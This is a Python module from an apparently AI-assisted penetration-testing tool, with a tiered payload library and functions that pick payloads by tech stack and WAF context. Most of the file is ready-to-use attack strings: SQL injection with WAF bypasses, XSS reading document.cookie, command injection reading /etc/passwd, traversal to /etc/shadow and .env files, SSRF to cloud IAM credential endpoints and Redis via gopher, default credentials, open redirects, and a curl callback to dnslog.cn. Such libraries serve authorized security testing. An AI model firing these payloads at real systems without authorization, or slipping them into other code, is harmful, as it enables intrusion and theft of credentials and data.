"""智能 Payload 库：上下文感知的 payload 生成。

设计理念：
- 渗透测试高度适配：payload 按实际渗透测试场景分类
- 上下文感知：根据技术栈、参数类型、WAF 特征选择最优 payload
- 分层递进：从基础 payload 到高级绕过，逐步升级
- 与 AI 互补：提供确定性 payload 作为基础，AI 负责动态调整

payload 分层：
- Level 1: 基础探测 payload（快速检测）
- Level 2: 标准利用 payload（确认漏洞）
- Level 3: 绕过 payload（WAF/过滤场景）
"""

import logging
from dataclasses import dataclass, field
from enum import Enum

logger = logging.getLogger(__name__)


class PayloadLevel(Enum):
    """Payload 威力等级。"""
    BASIC = "basic"      # 基础探测
    STANDARD = "standard"  # 标准利用
    BYPASS = "bypass"    # 绕过 WAF/过滤


@dataclass
class PayloadItem:
    """单个 payload 条目。"""
    payload: str
    level: PayloadLevel
    description: str = ""
    requires_param: bool = True  # 是否需要注入到参数中
    tech_hint: str = ""  # 适用的技术栈提示


@dataclass
class PayloadSet:
    """一组 payload 集合。"""
    scene: str
    payloads: list[PayloadItem] = field(default_factory=list)

    def filter_by_level(self, level: PayloadLevel) -> list[PayloadItem]:
        return [p for p in self.payloads if p.level == level]

    def filter_by_tech(self, tech: str) -> list[PayloadItem]:
        tech_lower = tech.lower()
        return [
            p for p in self.payloads
            if not p.tech_hint or p.tech_hint.lower() in tech_lower or tech_lower in p.tech_hint.lower()
        ]


# ===== SQL 注入 Payload 库 =====

SQLI_PAYLOADS = PayloadSet(
    scene="sqli",
    payloads=[
        # Level 1: 基础探测
        PayloadItem("'", PayloadLevel.BASIC, "单引号触发 SQL 错误"),
        PayloadItem('"', PayloadLevel.BASIC, "双引号触发 SQL 错误"),
        PayloadItem("\\", PayloadLevel.BASIC, "反斜杠触发转义错误"),
        PayloadItem("1 OR 1=1", PayloadLevel.BASIC, "数字型注入探测", tech_hint="mysql"),
        PayloadItem("1' OR '1'='1", PayloadLevel.BASIC, "字符型注入探测"),
        PayloadItem("1) OR (1=1", PayloadLevel.BASIC, "括号闭合注入探测"),

        # Level 2: 标准利用
        PayloadItem("' AND 1=1 -- ", PayloadLevel.STANDARD, "布尔盲注 true 条件"),
        PayloadItem("' AND 1=2 -- ", PayloadLevel.STANDARD, "布尔盲注 false 条件"),
        PayloadItem("' AND SLEEP(5) -- ", PayloadLevel.STANDARD, "MySQL 时间盲注", tech_hint="mysql"),
        PayloadItem("'; WAITFOR DELAY '0:0:5' -- ", PayloadLevel.STANDARD, "MSSQL 时间盲注", tech_hint="mssql"),
        PayloadItem("' AND pg_sleep(5) -- ", PayloadLevel.STANDARD, "PostgreSQL 时间盲注", tech_hint="postgresql"),
        PayloadItem("' UNION SELECT NULL -- ", PayloadLevel.STANDARD, "UNION 注入列数探测"),
        PayloadItem("' UNION SELECT NULL,NULL -- ", PayloadLevel.STANDARD, "UNION 2 列"),
        PayloadItem("' UNION SELECT NULL,NULL,NULL -- ", PayloadLevel.STANDARD, "UNION 3 列"),
        PayloadItem("' AND extractvalue(1,concat(0x7e,version())) -- ", PayloadLevel.STANDARD, "MySQL 报错注入", tech_hint="mysql"),
        PayloadItem("' AND updatexml(1,concat(0x7e,user()),1) -- ", PayloadLevel.STANDARD, "MySQL updatexml 报错", tech_hint="mysql"),

        # Level 3: 绕过
        PayloadItem("' /*!AND*/ 1=1 -- ", PayloadLevel.BYPASS, "MySQL 内联注释绕过", tech_hint="mysql"),
        PayloadItem("' AnD 1=1 -- ", PayloadLevel.BYPASS, "大小写混合绕过"),
        PayloadItem("' %41ND 1=1 -- ", PayloadLevel.BYPASS, "URL 编码绕过"),
        PayloadItem("' AND 1=1%23", PayloadLevel.BYPASS, "# 注释绕过（URL 不编码）", tech_hint="mysql"),
        PayloadItem("1'/**/OR/**/1=1", PayloadLevel.BYPASS, "内联注释分隔绕过"),
        PayloadItem("' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(user(),0x7c,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) -- ", PayloadLevel.BYPASS, "MySQL floor 报错绕过", tech_hint="mysql"),
    ],
)


# ===== XSS Payload 库 =====

XSS_PAYLOADS = PayloadSet(
    scene="xss",
    payloads=[
        # Level 1: 基础探测
        PayloadItem("<script>alert(1)</script>", PayloadLevel.BASIC, "基础 script 标签"),
        PayloadItem("<img src=x onerror=alert(1)>", PayloadLevel.BASIC, "img onerror 事件"),
        PayloadItem("<svg onload=alert(1)>", PayloadLevel.BASIC, "svg onload 事件"),
        PayloadItem("\"><script>alert(1)</script>", PayloadLevel.BASIC, "闭合属性后注入"),
        PayloadItem("javascript:alert(1)", PayloadLevel.BASIC, "JavaScript 协议"),

        # Level 2: 上下文适配
        PayloadItem("'><script>alert(document.domain)</script>", PayloadLevel.STANDARD, "获取域名信息"),
        PayloadItem("\" onfocus=alert(1) autofocus=\"", PayloadLevel.STANDARD, "属性内注入"),
        PayloadItem("';alert(document.cookie);//", PayloadLevel.STANDARD, "JS 上下文注入"),
        PayloadItem("<iframe src=javascript:alert(1)>", PayloadLevel.STANDARD, "iframe 注入"),
        PayloadItem("<body onload=alert(1)>", PayloadLevel.STANDARD, "body onload 事件"),
        PayloadItem("<details open ontoggle=alert(1)>", PayloadLevel.STANDARD, "details ontoggle 事件"),
        PayloadItem("<input onfocus=alert(1) autofocus>", PayloadLevel.STANDARD, "input autofocus 事件"),

        # Level 3: 绕过
        PayloadItem("<ScRiPt>alert(1)</ScRiPt>", PayloadLevel.BYPASS, "大小写混合绕过"),
        PayloadItem("<script >alert(1)</script >", PayloadLevel.BYPASS, "空格干扰绕过"),
        PayloadItem("<svg/onload=alert(1)>", PayloadLevel.BYPASS, "斜杠分隔绕过"),
        PayloadItem("<img src=x:onerror=alert(1)>", PayloadLevel.BYPASS, "冒号分隔绕过"),
        PayloadItem("<script>eval(atob('YWxlcnQoMSk='))</script>", PayloadLevel.BYPASS, "Base64 编码绕过"),
        PayloadItem("\\u003cscript\\u003ealert(1)\\u003c/script\\u003e", PayloadLevel.BYPASS, "Unicode 编码绕过"),
        PayloadItem("<scr<script>ipt>alert(1)</scr</script>ipt>", PayloadLevel.BYPASS, "嵌套标签绕过过滤"),
    ],
)


# ===== 命令注入 Payload 库 =====

CMD_INJECTION_PAYLOADS = PayloadSet(
    scene="cmd_injection",
    payloads=[
        # Level 1: 基础探测
        PayloadItem("; id", PayloadLevel.BASIC, "Linux id 命令", tech_hint="linux"),
        PayloadItem("| whoami", PayloadLevel.BASIC, "Windows/Linux whoami"),
        PayloadItem("&& id", PayloadLevel.BASIC, "逻辑与执行", tech_hint="linux"),
        PayloadItem("$(whoami)", PayloadLevel.BASIC, "命令替换 $()"),
        PayloadItem("`id`", PayloadLevel.BASIC, "反引号命令替换"),

        # Level 2: 确认利用
        PayloadItem("; cat /etc/passwd", PayloadLevel.STANDARD, "读取 passwd 文件", tech_hint="linux"),
        PayloadItem("| type C:\\windows\\win.ini", PayloadLevel.STANDARD, "读取 win.ini", tech_hint="windows"),
        PayloadItem("; sleep 5", PayloadLevel.STANDARD, "时间延迟确认", tech_hint="linux"),
        PayloadItem("| ping -n 5 127.0.0.1", PayloadLevel.STANDARD, "Windows 时间延迟", tech_hint="windows"),
        PayloadItem("; ls -la", PayloadLevel.STANDARD, "列目录", tech_hint="linux"),
        PayloadItem("&& net user", PayloadLevel.STANDARD, "Windows 用户列表", tech_hint="windows"),
        PayloadItem("; curl http://dnslog.cn", PayloadLevel.STANDARD, "DNS 回连确认"),

        # Level 3: 绕过
        PayloadItem(";${IFS}id", PayloadLevel.BYPASS, "IFS 变量绕过空格过滤", tech_hint="linux"),
        PayloadItem(";i\\d", PayloadLevel.BYPASS, "反斜杠绕过关键词过滤"),
        PayloadItem(";i''d", PayloadLevel.BYPASS, "引号绕过关键词过滤"),
        PayloadItem(";i${x}d", PayloadLevel.BYPASS, "变量扩展绕过"),
        PayloadItem("%0aid", PayloadLevel.BYPASS, "换行符绕过"),
        PayloadItem(";  cat</etc/passwd", PayloadLevel.BYPASS, "重定向绕过空格过滤", tech_hint="linux"),
    ],
)


# ===== 路径穿越 Payload 库 =====

PATH_TRAVERSAL_PAYLOADS = PayloadSet(
    scene="path_traversal",
    payloads=[
        # Level 1: 基础探测
        PayloadItem("../../../etc/passwd", PayloadLevel.BASIC, "Linux passwd", tech_hint="linux"),
        PayloadItem("..\\..\\..\\windows\\win.ini", PayloadLevel.BASIC, "Windows win.ini", tech_hint="windows"),
        PayloadItem("../../../etc/hosts", PayloadLevel.BASIC, "Linux hosts 文件", tech_hint="linux"),
        PayloadItem("/etc/passwd", PayloadLevel.BASIC, "绝对路径", tech_hint="linux"),
        PayloadItem("C:\\windows\\win.ini", PayloadLevel.BASIC, "Windows 绝对路径", tech_hint="windows"),

        # Level 2: 深度穿越
        PayloadItem("../../../../../../etc/passwd", PayloadLevel.STANDARD, "深层穿越", tech_hint="linux"),
        PayloadItem("../../../../../../etc/shadow", PayloadLevel.STANDARD, "shadow 文件", tech_hint="linux"),
        PayloadItem("../../../../../../etc/nginx/nginx.conf", PayloadLevel.STANDARD, "Nginx 配置", tech_hint="nginx"),
        PayloadItem("../../../../../../etc/httpd/conf/httpd.conf", PayloadLevel.STANDARD, "Apache 配置", tech_hint="apache"),
        PayloadItem("../../../../../../app/config/database.yml", PayloadLevel.STANDARD, "Rails 数据库配置", tech_hint="rails"),
        PayloadItem("../../../../../../var/www/html/.env", PayloadLevel.STANDARD, ".env 文件", tech_hint="php"),
        PayloadItem("../../../../../../proc/self/environ", PayloadLevel.STANDARD, "procfs environ", tech_hint="linux"),

        # Level 3: 编码绕过
        PayloadItem("%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", PayloadLevel.BYPASS, "URL 编码", tech_hint="linux"),
        PayloadItem("..%252f..%252f..%252fetc%252fpasswd", PayloadLevel.BYPASS, "双重 URL 编码", tech_hint="linux"),
        PayloadItem("..%c0%af..%c0%af..%c0%afetc%c0%afpasswd", PayloadLevel.BYPASS, "UTF-8 编码绕过", tech_hint="linux"),
        PayloadItem("....//....//....//etc/passwd", PayloadLevel.BYPASS, "双重点绕过过滤", tech_hint="linux"),
        PayloadItem("..%5c..%5c..%5cwindows%5cwin.ini", PayloadLevel.BYPASS, "URL 编码反斜杠", tech_hint="windows"),
    ],
)


# ===== SSRF Payload 库 =====

SSRF_PAYLOADS = PayloadSet(
    scene="ssrf",
    payloads=[
        # Level 1: 内网探测
        PayloadItem("http://127.0.0.1", PayloadLevel.BASIC, "本地回环"),
        PayloadItem("http://localhost", PayloadLevel.BASIC, "localhost"),
        PayloadItem("http://127.0.0.1:80", PayloadLevel.BASIC, "HTTP 端口"),
        PayloadItem("http://127.0.0.1:22", PayloadLevel.BASIC, "SSH 端口"),
        PayloadItem("http://127.0.0.1:6379", PayloadLevel.BASIC, "Redis 端口"),
        PayloadItem("http://127.0.0.1:9200", PayloadLevel.BASIC, "Elasticsearch 端口"),

        # Level 2: 云元数据 + 文件协议
        PayloadItem("http://169.254.169.254/latest/meta-data/", PayloadLevel.STANDARD, "AWS 元数据"),
        PayloadItem("http://169.254.169.254/latest/meta-data/iam/security-credentials/", PayloadLevel.STANDARD, "AWS IAM 凭证"),
        PayloadItem("http://metadata.google.internal/computeMetadata/v1/", PayloadLevel.STANDARD, "GCP 元数据"),
        PayloadItem("http://169.254.169.254/metadata/instance?api-version=2021-02-01", PayloadLevel.STANDARD, "Azure 元数据"),
        PayloadItem("file:///etc/passwd", PayloadLevel.STANDARD, "file:// 读文件", tech_hint="linux"),
        PayloadItem("file:///C:/Windows/win.ini", PayloadLevel.STANDARD, "file:// 读 Windows 文件", tech_hint="windows"),
        PayloadItem("dict://127.0.0.1:6379/INFO", PayloadLevel.STANDARD, "dict:// Redis 信息"),
        PayloadItem("gopher://127.0.0.1:6379/_INFO", PayloadLevel.STANDARD, "gopher:// Redis"),

        # Level 3: 绕过
        PayloadItem("http://0x7f000001", PayloadLevel.BYPASS, "十六进制 IP 绕过"),
        PayloadItem("http://017700000001", PayloadLevel.BYPASS, "八进制 IP 绕过"),
        PayloadItem("http://2130706433", PayloadLevel.BYPASS, "十进制 IP 绕过"),
        PayloadItem("http://[::1]", PayloadLevel.BYPASS, "IPv6 回环绕过"),
        PayloadItem("http://127.1", PayloadLevel.BYPASS, "短 IP 绕过"),
        PayloadItem("http://127.0.0.1.nip.io", PayloadLevel.BYPASS, "DNS 重绑定绕过"),
        PayloadItem("http://localtest.me", PayloadLevel.BYPASS, "解析到 127.0.0.1 的域名"),
    ],
)


# ===== 弱口令 Payload 库 =====

WEAK_PASSWORD_PAYLOADS = PayloadSet(
    scene="weak_password",
    payloads=[
        # 常见用户名
        PayloadItem("admin", PayloadLevel.BASIC, "常见用户名 admin"),
        PayloadItem("root", PayloadLevel.BASIC, "常见用户名 root"),
        PayloadItem("test", PayloadLevel.BASIC, "常见用户名 test"),
        PayloadItem("user", PayloadLevel.BASIC, "常见用户名 user"),
        PayloadItem("guest", PayloadLevel.BASIC, "常见用户名 guest"),
        PayloadItem("administrator", PayloadLevel.BASIC, "常见用户名 administrator"),

        # 常见弱口令
        PayloadItem("admin", PayloadLevel.STANDARD, "弱口令 admin"),
        PayloadItem("password", PayloadLevel.STANDARD, "弱口令 password"),
        PayloadItem("123456", PayloadLevel.STANDARD, "弱口令 123456"),
        PayloadItem("admin123", PayloadLevel.STANDARD, "弱口令 admin123"),
        PayloadItem("root", PayloadLevel.STANDARD, "弱口令 root"),
        PayloadItem("12345678", PayloadLevel.STANDARD, "弱口令 12345678"),
        PayloadItem("test", PayloadLevel.STANDARD, "弱口令 test"),
        PayloadItem("qwerty", PayloadLevel.STANDARD, "弱口令 qwerty"),
        PayloadItem("P@ssw0rd", PayloadLevel.STANDARD, "弱口令 P@ssw0rd"),
        PayloadItem("admin@123", PayloadLevel.STANDARD, "弱口令 admin@123"),

        # 用户名=密码组合
        PayloadItem("admin:admin", PayloadLevel.STANDARD, "用户名=密码 admin"),
        PayloadItem("root:root", PayloadLevel.STANDARD, "用户名=密码 root"),
        PayloadItem("test:test", PayloadLevel.STANDARD, "用户名=密码 test"),
        PayloadItem("guest:guest", PayloadLevel.STANDARD, "用户名=密码 guest"),
    ],
)


# ===== 开放重定向 Payload 库 =====

OPEN_REDIRECT_PAYLOADS = PayloadSet(
    scene="open_redirect",
    payloads=[
        PayloadItem("https://evil.com", PayloadLevel.BASIC, "外部 URL"),
        PayloadItem("//evil.com", PayloadLevel.BASIC, "协议相对 URL"),
        PayloadItem("//evil.com/", PayloadLevel.STANDARD, "协议相对 URL 带路径"),
        PayloadItem("https://evil.com/", PayloadLevel.STANDARD, "完整外部 URL"),
        PayloadItem("//evil.com@target.com", PayloadLevel.BYPASS, "URL 认证绕过"),
        PayloadItem("https:evil.com", PayloadLevel.BYPASS, "缺少斜杠绕过"),
        PayloadItem("javascript:alert(document.domain)", PayloadLevel.STANDARD, "JavaScript 协议"),
    ],
)


# ===== Payload 集合管理 =====

PAYLOAD_SETS: dict[str, PayloadSet] = {
    "sqli": SQLI_PAYLOADS,
    "xss": XSS_PAYLOADS,
    "cmd_injection": CMD_INJECTION_PAYLOADS,
    "path_traversal": PATH_TRAVERSAL_PAYLOADS,
    "ssrf": SSRF_PAYLOADS,
    "weak_password": WEAK_PASSWORD_PAYLOADS,
    "open_redirect": OPEN_REDIRECT_PAYLOADS,
}


def get_payloads(
    scene: str,
    level: PayloadLevel | str | None = None,
    tech: str = "",
    count: int = 20,
) -> list[dict]:
    """获取 payload 列表。

    Args:
        scene: 场景 sqli/xss/cmd_injection/path_traversal/ssrf/weak_password/open_redirect
        level: 筛选等级 basic/standard/bypass，None 为全部
        tech: 技术栈筛选（如 mysql/nginx/linux）
        count: 最多返回数量

    Returns:
        [{payload, level, description, tech_hint}]
    """
    scene = scene.lower().strip()

    # 别名映射
    scene_aliases = {
        "sql": "sqli",
        "sql_injection": "sqli",
        "command_injection": "cmd_injection",
        "cmd": "cmd_injection",
        "path": "path_traversal",
        "lfi": "path_traversal",
        "redirect": "open_redirect",
        "password": "weak_password",
    }
    scene = scene_aliases.get(scene, scene)

    payload_set = PAYLOAD_SETS.get(scene)
    if not payload_set:
        return []

    # 等级筛选
    if level:
        if isinstance(level, str):
            level = PayloadLevel(level)
        items = payload_set.filter_by_level(level)
    else:
        items = list(payload_set.payloads)

    # 技术栈筛选
    if tech:
        tech_items = payload_set.filter_by_tech(tech)
        if tech_items:
            # 优先返回匹配技术栈的，再补充通用的
            tech_payloads = {p.payload for p in tech_items}
            items = tech_items + [p for p in items if p.payload not in tech_payloads]

    # 去重
    seen = set()
    result = []
    for item in items[:count]:
        if item.payload not in seen:
            seen.add(item.payload)
            result.append({
                "payload": item.payload,
                "level": item.level.value,
                "description": item.description,
                "tech_hint": item.tech_hint,
            })

    return result


def get_recommended_payloads(
    scene: str,
    tech_stack: dict | None = None,
    param_type: str = "",
    count: int = 15,
) -> list[dict]:
    """根据上下文推荐 payload。

    智能选择策略：
    1. 根据 tech_stack 过滤适用 payload
    2. 根据 param_type 调整优先级
    3. 默认从 BASIC 开始，逐步升级
    """
    tech_stack = tech_stack or {}

    # 构建技术栈关键词
    tech_parts = []
    for key in ("server", "framework", "language", "database", "os", "cms"):
        val = tech_stack.get(key, "")
        if val:
            tech_parts.append(val.lower())
    tech_str = " ".join(tech_parts)

    # 参数类型提示
    if param_type:
        param_lower = param_type.lower()
        if param_lower in ("url", "redirect", "callback", "webhook", "return_url", "next"):
            scene = "open_redirect" if scene == "sqli" else scene
        elif param_lower in ("file", "path", "page", "template", "filename"):
            scene = "path_traversal" if scene == "sqli" else scene

    # 先获取基础 payload，再补充标准 payload
    basic = get_payloads(scene, level=PayloadLevel.BASIC, tech=tech_str, count=count)
    remaining = count - len(basic)
    if remaining > 0:
        standard = get_payloads(scene, level=PayloadLevel.STANDARD, tech=tech_str, count=remaining)
        basic.extend(standard)
        remaining = count - len(basic)
        if remaining > 0:
            bypass = get_payloads(scene, level=PayloadLevel.BYPASS, tech=tech_str, count=remaining)
            basic.extend(bypass)

    return basic[:count]


def list_scenes() -> list[str]:
    """列出所有可用场景。"""
    return list(PAYLOAD_SETS.keys())
